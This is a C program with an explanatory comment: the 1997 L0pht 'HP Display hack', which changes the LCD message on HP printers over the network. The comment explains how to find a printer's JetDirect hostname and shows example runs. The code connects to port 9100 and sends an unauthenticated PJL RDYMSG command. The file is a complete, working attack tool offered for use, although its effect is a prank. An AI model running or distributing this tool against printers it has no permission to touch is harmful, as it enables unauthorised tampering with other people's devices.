#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <unistd.h>
#include <strings.h>
#include <stdlib.h>

/*


Changing the LCD display text using HPhack, IGhphack or Hijetter

This is an old hack (1997) and does not accomplish much, but it is fun! Silicosis of L0pht 
(sili@l0pht.com) wrote the original exploit code for *nix  systems and someone else ported 
it to NT/2000/XP based systems. Although it's been out there for a long time, it still works 
on every HP printer/JetDirect box I have seen. What the HP display hack allows you to do is 
set the text that displays on the little LCD panel of an HP printer. It accomplishes this 
over the network by sending packets to a JetDirect box hooked to the printer (or built into it).

The first thing you need to do is find out the IP or hostname of the JetDirect box that services 
the printer. You can do this in one of at least three ways. The first way is by hitting the 
little test button on the JetDirect box that's connected to the printer. If the JetDirect 
card is built in you may have to go through the menus and choose "Print Configuration". 
Another way is to go into your "Printers and Faxs" settings, right click and bring up the 
properties of the printer in question, and look under the Ports tab for the hostname 
(npi******). Once you have this information it's easy to run Silicosis ' little hack.

To run it from Windows just use the following syntax: hpnt Hostname Message
Windows Example:

C:\>hpnt npi769e71 "Irongeek"
HP Display hack -- sili@l0pht.com
Hostname: npi769e71
Message: Irongeek
Connecting....
Sent 54 bytes

C:\>hpnt 192.168.1.14 "Irongeek Also"
HP Display hack -- sili@l0pht.com
Hostname: 192.168.1.14 
Message: Irongeek Also
Connecting....
Sent 59 bytes

C:\>

 */

#define PORT 9100

int main (int argc, char *argv[]) {

    int sockfd,len,bytes_sent;   /* Sock FD */
    struct hostent *host;   /* info from gethostbyname */
    struct sockaddr_in dest_addr;   /* Host Address */
    char line[100];
     
    if (argc !=3) {
        printf("HP Display Hack\n--sili@l0pht.com 12/8/97\n\n%s printer \"message\"\n",argv[0]);
        printf("\tMessage can be up to 16 characters long (44 on 5si's)\n");
        exit(1);
    }

    if ( (host=gethostbyname(argv[1])) == NULL) {
        perror("gethostbyname");
        exit(1);
    }

    printf ("HP Display hack -- sili@l0pht.com\n");
    printf ("Hostname:   %s\n", argv[1]);
    printf ("Message: %s\n",argv[2]);

    /* Prepare dest_addr */
    dest_addr.sin_family= host->h_addrtype;  /* AF_INET from gethostbyname */
    dest_addr.sin_port= htons(PORT) ; /* PORT defined above */

    /* Prepare dest_addr */
    bcopy(host->h_addr, (char *) &dest_addr.sin_addr, host->h_length);
    bzero(&(dest_addr.sin_zero), 8);  /* Take care of  sin_zero  ??? */ 
  
  /* Get socket */
  /*  printf ("Grabbing socket....\n"); */
    if ((sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0) {
        perror("socket");
        exit(1);
    }

    /* Connect !*/
    printf ("Connecting....\n");
    if (connect(sockfd, (struct sockaddr *)&dest_addr,sizeof(dest_addr)) == -1){
        perror("connect");
        exit(1);
    }

    /* Preparing JPL Command */
    strcpy(line,"\033%-12345X@PJL RDYMSG DISPLAY = \"");
    strncat(line,argv[2],44);
    strcat(line,"\"\r\n\033%-12345X\r\n");

    /* Sending data! */

    /*  printf ("Sending Data...%d\n",strlen(line));*/
    /*  printf ("Line: %s\n",line); */
    bytes_sent=send(sockfd,line,strlen(line),0);
  
    printf("Sent %d bytes\n",bytes_sent);
    close(sockfd);
}

